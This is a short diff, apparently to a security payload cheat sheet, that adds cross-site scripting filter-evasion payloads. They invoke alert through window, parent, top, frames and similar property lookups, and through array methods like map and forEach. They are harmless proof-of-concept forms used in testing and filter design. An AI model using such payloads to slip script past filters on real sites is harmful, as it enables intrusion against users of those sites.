@@ -52,4 +52,20 @@ setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
   
+  
+  window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+  
 ```
